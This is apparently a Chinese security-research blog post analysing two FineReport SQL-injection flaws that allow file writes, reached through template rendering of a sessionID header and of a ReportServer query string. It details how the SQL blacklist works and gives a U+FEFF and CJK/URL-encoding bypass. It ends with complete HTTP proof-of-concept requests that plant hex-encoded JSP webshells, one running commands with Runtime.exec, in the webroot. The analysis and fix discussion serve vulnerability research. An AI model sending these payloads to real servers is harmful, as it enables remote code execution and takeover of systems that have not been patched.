+<p>用表达式导出为文本：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 获取映射 Map，注意强制类型转换使用帆软的包名</span></span><br><span class="line">    java.util.<span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> ((com.fr.third.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping) hm).getHandlerMethods();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 使用 StringBuilder 拼接文本</span></span><br><span class="line">    java.lang.<span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.lang.StringBuilder();</span><br><span class="line">    sb.append(<span class="string">&quot;========== 帆软(FineReport)内部路由与方法映射 ==========\r\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (Object obj : map.entrySet()) &#123;</span><br><span class="line">        java.util.Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (java.util.Map.Entry) obj;</span><br><span class="line">        <span class="comment">// RequestMappingInfo 和 HandlerMethod 的 toString() 方法已经包含了非常详尽的 路径、请求方式 和 类方法名</span></span><br><span class="line">        sb.append(entry.getKey().toString())</span><br><span class="line">          .append(<span class="string">&quot;  ==&gt;  &quot;</span>)</span><br><span class="line">          .append(entry.getValue().toString())</span><br><span class="line">          .append(<span class="string">&quot;\r\n\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. 将拼接好的文本写入到本地文件</span></span><br><span class="line">    <span class="comment">// 这里默认写到当前服务启动的工作根目录下，你也可以改成绝对路径，如 &quot;D:\\fr_mappings.txt&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;fr_route_mappings.txt&quot;</span>;</span><br><span class="line">    java.nio.file.Files.write(java.nio.file.Paths.get(filePath), sb.toString().getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. 返回成功提示及绝对路径，方便你在电脑上找</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;导出成功！文件路径: &quot;</span> + <span class="keyword">new</span> <span class="title class_">java</span>.io.File(filePath).getAbsolutePath();</span><br><span class="line">    </span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;导出失败: &quot;</span> + e.getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773133888752-a998a2e2-09aa-42fc-925c-11ebd625c878.png"  alt="img"></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/CodeAudit/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8FineReport/fr_route_mappings.txt" >https://github.com/1diot9/MyJavaSecStudy/blob/main/CodeAudit/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8FineReport/fr_route_mappings.txt<i class="fas fa-external-link-alt"></i></a></p>
+<p>另外，&#x2F;webroot&#x2F;ReportServer 在这里会更好一些，因为直接进入servlet，没有过interceptor，这样会少一些鉴权。</p>
+<h1 id="print-ie-pdf-SQL注入写文件"><a href="#print-ie-pdf-SQL注入写文件" class="headerlink" title="&#x2F;print&#x2F;ie&#x2F;pdf  SQL注入写文件"></a>&#x2F;print&#x2F;ie&#x2F;pdf  SQL注入写文件</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773457124223-c82928de-1df9-40b4-b778-21a195f53b7f.png"  alt="img"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="恶意表达式获取"><a href="#恶意表达式获取" class="headerlink" title="恶意表达式获取"></a>恶意表达式获取</h3><p>用上面导出的controller映射关系搜索：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773395325973-4f4e45c7-d9ff-41b5-9b79-7b595ea5e8cd.png"  alt="img"></p>
+<p>能够找到两个路由：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;[/nx/report/v10/print/ie/pdf],methods=[GET]&#125;  ==&gt;  public void com.fr.nx.app.web.controller.NXController.pdfPrintForIE(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse) throws java.lang.Exception</span><br><span class="line">&#123;[/nx/report/v9/print/ie/pdf],methods=[GET]&#125;  ==&gt;  public void com.fr.nx.app.web.controller.NXController.pdfPrintForIEV9(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse) throws java.lang.Exception</span><br></pre></td></tr></table></figure>
+
+<p>这里只有v9那个有漏洞，v10会对传入的sessionID校验，和最后的官方修复一样。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773395481537-5cc0d3c2-3259-4847-b07d-f84a9a5f936b.png"  alt="img"></p>
+<p>这里的HANDLER就是PDFPrintPrintForIEHandler，后续的this就是指这个类。现在跟进handle：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773395588133-787749f7-9a33-4e6d-80e6-0fa4a9607efa.png"  alt="img"></p>
+<p>这里最终会进入最下面一行的handleRequest，继续跟进，来到com.fr.nx.app.web.v9.handler.handler.PDFPrintPrintForIEHandler#handleRequest：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773395688719-584c9b23-7bfe-4093-b41c-e03998705030.png"  alt="img"></p>
+<p>var3是从请求包中取出的sessionID，经过多次拼接后，最后到了var9里，最终被TemplateUtils.render渲染。这个TemplatesUtils是帆软自己的一个模板渲染工具，这也是我们许多漏洞存在的根本。</p>
+<p>因为帆软有许多自定义的函数，比如SUM、DATE，而这些函数，都能在模板渲染中被执行。而帆软提供了一个特别的函数——SQL：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finereport/doc-view-846.html" >https://help.fanruan.com/finereport/doc-view-846.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773396020986-8508ac7f-4fd2-4723-8763-a15db39092c7.png"  alt="img"></p>
+<p>在进行模板渲染时，我们可以使用${SQL()}的语法来执行SQL查询。而帆软默认存在以下数据库驱动：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773457433318-d9fb93f6-6630-4dad-a46d-01766db10e21.png"  alt="img"></p>
+<p>在这个漏洞中，我们利用sqlite，因为帆软默认存在一个测试数据库，在&#x2F;webroot&#x2F;help目录下，其使用的就是sqlite：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773457495732-659b1d35-08ae-4015-9896-5c871b019645.png"  alt="img"></p>
+<p>以上就是漏洞的大致原理，现在看一下如何传入payload。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773457663421-2f42e3c0-9a7f-48e2-9e5b-d98548d72938.png"  alt="img"></p>
+<p>连续跟进getOrGenerateSessionIDWithCheckRegister，最终来到com.fr.data.NetworkHelper#getHTTPRequestEncodeParameter：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773457882978-4e5cc600-57bf-4422-979f-797170e8bf8f.png"  alt="img"></p>
+<p>这里的var1是sessionID，var2是true。看一下框出来的两部分。</p>
+<p>先跟进到com.fr.data.DefaultRequestParameterHandler#getParameterFromHeader：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773458036355-344402a9-aeb8-478b-b0f4-57f82a042b1f.png"  alt="img"></p>
+<p>从header中取出sessionID字段。</p>
+<p>再跟进底下的checkURLDecode(var5)，var5就是sessionID的值：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773458177209-73cbb3ff-7db4-490a-a501-d63f405a51a5.png"  alt="img"></p>
+<p>这里的decodeText很重要：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773476102533-dd15e727-3f48-40c2-85bf-2e5c926c390a.png"  alt="img"></p>
+<p>会进行一次cjk解码，这种解码实际上就是把字符从16进制转回来，只不过这里的16进制都是[41][42]这样的格式。cjk编码的本意是将汉字等非ASCII字符转换成16进制。</p>
+<p>这个cjk编码对漏洞利用的帮助是：可以通过编码来绕过WAF检测。</p>
+<p>这个绕WAF技巧在帆软里几乎都可以用，因为所有从请求包中获取参数的方法，大多都会调用到com.fr.data.NetworkHelper#getHTTPRequestEncodeParameter。</p>
+<p>这个cjk绕过我最早是在Killer师傅的文章中看到（这个漏洞就是他发现的）：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/odnsC0RjgQGuAWKke3SOqA" >https://mp.weixin.qq.com/s/odnsC0RjgQGuAWKke3SOqA<i class="fas fa-external-link-alt"></i></a>  文末有cjk编码脚本。</p>
+<p>上面的checkURLDecode中，除了cjk解码，最后还会进行URL解码。而帆软的表达式函数中，又内置了DECODE，能够进行URL解码。这也能用于WAF绕过。</p>
+<p>所以，可以通过先URL编码，再cjk编码的方式，尝试绕过帆软WAF。</p>
+<p>到这里，我们就知道了sessionID的解析流程。回到一开始的handleRequest：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773476768632-6f768578-f1a2-4fd2-b6be-cc6cef3a7d11.png"  alt="img"></p>
+<p>获取到的sessionID，经过一系列字符串拼接，最后进行模板渲染，从而触发SQL注入。</p>
+<p>现在去yakit里试试，能不能实现延时。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/webroot/decision/nx/report/v9/print/ie/pdf</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8075</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br><span class="line">sessionID:&#123;&#123;urlesc($&#123;sql(&#x27;FRDemo&#x27;,&#x27;SELECT hex(randomblob(1));&#x27;,1)&#125;)&#125;&#125;</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br></pre></td></tr></table></figure>
+
+<p>因为sqlite里没有能直接延时的函数，所以通过生成大随机二进制块来产生计算延迟。</p>
+<p>为1时，耗时4ms：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773477824904-78a7c52c-d3fa-4383-9815-7a7063329069.png"  alt="img"></p>
+<p>为100000时，耗时34ms：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773478122000-92b54eec-e8d3-404d-828b-39513dd4d5bd.png"  alt="img"></p>
+<p>10000000时，直接变成了167ms：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773478177029-a82d1a6d-a445-489d-8203-830416b44e36.png"  alt="img"></p>
+<p>数字再大一些，会直接报错。成功证明实现了SQL注入。</p>
+<h3 id="SQL注入写文件"><a href="#SQL注入写文件" class="headerlink" title="SQL注入写文件"></a>SQL注入写文件</h3><p>上面的危害只是停留在了SQL盲注，现在来试试通过Sqlite写文件，达到写webshell的目的。</p>
+<p>不过先来看看帆软SQL过滤机制。</p>
+<p>第一处过滤</p>
+<p>在com.fr.function.SQL#run断点：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773478618734-a27cf008-e702-4678-8d07-d5e01cfe80ea.png"  alt="img"></p>
+<p>第一处检测在dealWithParameters处，会开始处理sql查询语句，调用栈如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL#run</span><br><span class="line">  → dealWithParameters()                                    </span><br><span class="line">    → EscapeSqlHelper.processParametersBeforeAnalyzeSQL()   </span><br><span class="line">      → EscapeSqlLocalHelper.processEscape()                </span><br><span class="line">        → EscapeSqlLocalHelper.hasForbidWord()              </span><br></pre></td></tr></table></figure>
+
+<p>先说一下，第一处检测在漏洞利用过程中是不会触发的，不过还是讲一下，因为自己看的时候特别疑惑到底有几层检测，又在哪里，在什么情况触发。</p>
+<p>dealWithParameters：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773478962733-0b17577b-af65-484d-a666-e97ca510ee9d.png"  alt="img"></p>
+<p>这里会清除语句中的注释符。然后进入analyze4Parameters：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773485470747-30faf45d-8865-43f4-99f1-de33a930a742.png"  alt="img"></p>
+<p>由于var1为false，所以跟进框中的analyze4Parameters：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773490460299-5c7ed8f3-63f8-4aaf-8f08-a4679a0682cb.png"  alt="img"></p>
+<p>var0就是我们的sql语句。这里会做匹配，匹配 [? ?] 或者 ${} 。其本质是占位符，就跟mybatis里的 select * from users where name &#x3D; ${name}一样，不过mybatis记得用 #{} 防注入。</p>
+<p>可以看一下官方文档的介绍：<a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finereport/doc-view-846.html" >https://help.fanruan.com/finereport/doc-view-846.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773491034133-662d781f-2bbf-40f8-b52d-6349c17cacda.png"  alt="img"></p>
+<p>回到dealWithParameters：<br><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773491148755-5f792492-d7fa-430d-9cd5-1a918602d6a2.png"  alt="img"></p>
+<p>只有当执行的sql语句里有占位符时，才会运行到else中。然后在processParametersBeforeAnalyzeSQL处进行检测，跟进到com.fr.data.impl.escapesql.local.EscapeSqlLocalHelper#processEscape：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773491403522-f59bedfd-5c5d-454a-a43c-8a7ce89332a5.png"  alt="img"></p>
+<p>这里会对占位符中的sql语句检测。黑名单如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773491431054-f9d52edc-fadf-4c5e-98e1-b9baccbedb2d.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773491440183-6bbd0240-fd82-435a-a5a2-8abd3c244480.png"  alt="img"></p>
+<p>看到这里很熟悉，这不就是后台设置SQL注入的地方吗？</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773491583092-f4e02ea6-daaf-4853-86af-ec315b49a9d6.png"  alt="img"></p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>现在看第二处检测。</p>
+<p>这里的检测点可以通过日志中的报错堆栈获取。logs&#x2F;fanruan.log</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773539277839-b8385b72-eb7c-4e21-b08b-de4276ccc2a8.png"  alt="img"></p>
+<p>在com.fr.cbb.dialect.security.JDBCSecurityChecker#checkQuery(java.lang.String, com.fr.cbb.dialect.security.element.InsecurityElement[])处打断点：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773492060898-574dc3c6-cf97-4080-937e-125375e9da35.png"  alt="img"></p>
+<p>先看removeSpecialCharacters，ignoreQuotesAndNotes会移除引号内的字符。比如where name&#x3D;’any’会变成where name&#x3D;。另外里面的isSpecialCharacter方法也很关键：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773492194252-38ea5097-4a1c-47ff-82df-95bdfa97c7ca.png"  alt="img"></p>
+<p>这些特殊符号会被移除。</p>
+<p>接着进入check：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773492652382-a1f5ec23-b9b8-46b5-97ae-f50a75d5d5f4.png"  alt="img"></p>
+<p>黑名单：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773492673928-0c716f57-6a79-40ad-aae5-b0ec106e044f.png"  alt="img"></p>
+<p>跟进probe：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773492911411-5fcbbd31-4896-4037-a47e-5d3727eb896d.png"  alt="img"></p>
+<p>这里检测语句中有没有包含” drop “，注意，关键词前后有两个空格，很重要，是后面绕过的基础。</p>
+<p>那么，怎么这些黑名单是怎么加载的，往前看调用栈：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773493086278-c9eafe05-5dae-459f-ab90-df1a5a465e76.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773493102380-2fa3a9bb-1c2f-40b2-a585-82f2fc268aea.png"  alt="img"></p>
+<p>在InsecurityElementFactory的静态代码块中设置的，同时还设置了JDBC URL的关键词黑名单，同时也针对不同的数据库，设置了特有的黑名单。只不过这里传入的dbType为空，所以只会载入静态代码最下面的公共黑名单。</p>
+<p>至此帆软SQL检测机制分析完毕。</p>
+<h3 id="SQL绕过"><a href="#SQL绕过" class="headerlink" title="SQL绕过"></a>SQL绕过</h3><p>sqlite可以通过attach，create，insert的方式写文件。但是怎么绕过黑名单？</p>
+<p>这里参考y4attack博客中的技巧：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82" >https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82<i class="fas fa-external-link-alt"></i></a></p>
+<p>当sqlite语句中的第一个字符为U+FEFF（URL编码对应%EF%BB%BF），在执行时会被移除。</p>
+<p>于是可以通过这种方式绕过，因为检测是检测 “ attach “，需要前后有空格才能检测到。</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>最终poc：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/webroot/decision/nx/report/v9/print/ie/pdf</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8075</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br><span class="line">sessionID:sessionID:[24][7B][5F][5F]fr[5F]locale[5F][5F][3D]sql[28][27]FRDemo[27][2C]DECODE[28][27][25]25EF[25]25BB[25]25BFATTACH[25]2520DATABASE[25]2520[25]2527[2E][2E][25]252Fwebapps[25]252Fwebroot[25]252Fzddc[2E]jsp[25]2527[25]2520as[25]2520jwgeed[25]253B[27][29][2C]1[2C]1[29][7D][24][7B][5F][5F]fr[5F]locale[5F][5F][3D]sql[28][27]FRDemo[27][2C]DECODE[28][27][25]25EF[25]25BB[25]25BFCREATE[25]2520TABLE[25]2520jwgeed[2E]xff[25]2528data[25]2520text[25]2529[25]253B[27][29][2C]1[2C]1[29][7D][24][7B][5F][5F]fr[5F]locale[5F][5F][3D]sql[28][27]FRDemo[27][2C]DECODE[28][27][25]25EF[25]25BB[25]25BFINSERT[25]2520INTO[25]2520jwgeed[2E]xff[25]2528data[25]2529[25]2520VALUES[25]2520[25]2528x[25]25273c2540207061676520696d706f72743d226a6176612e696f2e2a2c6a6176612e7574696c2e4261736536342220253e3c256f75742e7072696e7428224b464322293b537472696e6720613d726571756573742e676574506172616d6574657228226122293b69662861213d6e756c6c297b627974655b5d20623d4261736536342e6765744465636f64657228292e6465636f64652861293b537472696e6720703d726571756573742e676574536572766c6574436f6e7465787428292e6765745265616c5061746828726571756573742e676574536572766c6574506174682829293b537472696e67206469723d6e65772046696c652870292e676574506172656e7428293b46696c654f757470757453747265616d206f3d6e65772046696c654f757470757453747265616d286e65772046696c65286469722c22776562726f6f742d686f6d652e6a73702229293b6f2e77726974652862293b6f2e636c6f736528293b7d253e0a[25]2527[25]2529[25]253B[27][29][2C]1[2C]1[29][7D]</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br></pre></td></tr></table></figure>
+
+<p>还需要载入jsp解析器：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773504799071-171488ab-0bca-4cec-b9de-12858abb665f.png"  alt="img"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/webroot/decision/file?path=org.apache.jasper.servlet.JasperInitializer&amp;type=class</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8075</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773537972627-3df05012-d837-4445-baef-52c2efbd344e.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773538037531-9614fd1a-f089-45a6-9417-49f1e15301b3.png"  alt="img"></p>
+<h2 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h2><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773495150589-6691169e-9085-4187-a42c-b3fce830ec84.png"  alt="img"></p>
+<p>会对sessionID校验，不允许传入恶意的了。</p>
+<p>同时，在sql语句去除特殊符号时，也考虑了 U+FEFF：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773553038987-cd8d7975-f8f8-441a-b95c-1a174867fd55.png"  alt="img"></p>
+<p>另外，官方的安全插件也有防jsp落地的保护，但是插件不会默认安装：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773559090188-b84412ec-51e1-4d34-b5bf-637b95eab60f.png"  alt="img"></p>
+<h1 id="view-ReportServer-SQL注入写文件"><a href="#view-ReportServer-SQL注入写文件" class="headerlink" title="&#x2F;view&#x2F;ReportServer? SQL注入写文件"></a>&#x2F;view&#x2F;ReportServer? SQL注入写文件</h1><p><a class="link"   target="_blank" rel="noopener" href="https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/" >https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773502894278-95c67424-8b76-45e7-b262-50d053cdd5fb.png"  alt="img"></p>
+<p>11.0.1&lt;&#x3D;FineReport&lt;&#x3D;11.0.28</p>
+<p>FineBI和FineDataLink根据更新日志翻了一下，下面是推断的版本：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finebi6.X/doc-view-2355.html" >https://help.fanruan.com/finebi6.X/doc-view-2355.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finedatalink/doc-view-751.html" >https://help.fanruan.com/finedatalink/doc-view-751.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>6.1.0&lt;&#x3D;FineBI&lt;&#x3D;6.1.1 6.0&lt;&#x3D;FineBI&lt;&#x3D;6.0.18（6.0.*）</p>
+<p>4.1&lt;&#x3D;FineDataLink&lt;&#x3D;4.1.11  4.0.1&lt;&#x3D;FineDataLink&lt;&#x3D;4.0.30（4.0.*）</p>
+<p>FineDataLink文档没写更新时间，是通过历史版本里最早的版本来确定：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773503472130-fbe1355e-f6cf-472b-b040-ca0f4338003b.png"  alt="img"></p>
+<p>老版本离线文档的位置都在这里：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773503783209-80d83cb5-b615-454b-810b-be295ad66d91.png"  alt="img"></p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先搜漏洞路由找处理类：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773504244083-e45f1ebd-c27f-4d1b-b6bf-ab9183eded9c.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773504279442-ce1809c1-66c4-4f35-93d2-d4511d2d9541.png"  alt="img"></p>
+<p>漏洞点很明显了，跟上面的原理一样，都是模板解析导致的SQL注入。</p>
+<p>不过在参数解析上，还是有一些不同。</p>
+<p>这里的getQueryString，是tomcat内置方法，直接不经解码获取GET中的参数。但我们知道，tomcat的URL中是不能传入一些特殊符号的，比如双引号和空格：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773538298591-beb813fd-1535-4638-845f-e7ce46ecab7f.png"  alt="img"></p>
+<p>双引号可以用单引号代替，空格可以用注释符代替，但是如果sql语句里本身要用到引号的话，就没办法了。</p>
+<p>这里就需要用到帆软自带的另一个函数了——DECODE：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773538183061-7dbed7c5-0261-406d-b9d0-778468668d20.png"  alt="img"></p>
+<p>这样就可以把sql语句中的特殊符号传入GET参数。</p>
+<p>后面的sql注入写文件，和上面的漏洞就一样了。由于影响版本还比上面的更早，所以也sql黑名单也一样。都可以通过U+FEFF这个方法去绕。</p>
+<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/webroot/decision/view/ReportServer?$&#123;sql(&#x27;FRDemo&#x27;,DECODE(&#x27;%EF%BB%BFATTACH%20DATABASE%20%27..%2Fwebapps%2Fwebroot%2Ftest.jsp%27%20as%20test1%3B&#x27;),1,1)&#125;$&#123;sql(&#x27;FRDemo&#x27;,DECODE(&#x27;%EF%BB%BFCREATE%20TABLE%20test1.exp%28data%20text%29%3B&#x27;),1,1)&#125;$&#123;sql(&#x27;FRDemo&#x27;,DECODE(&#x27;%EF%BB%BFINSERT%20INTO%20test1.exp%28data%29%20VALUES%20%28x%273c252052756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229293b20253e%27%29%3B&#x27;),1,1)&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8075</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span 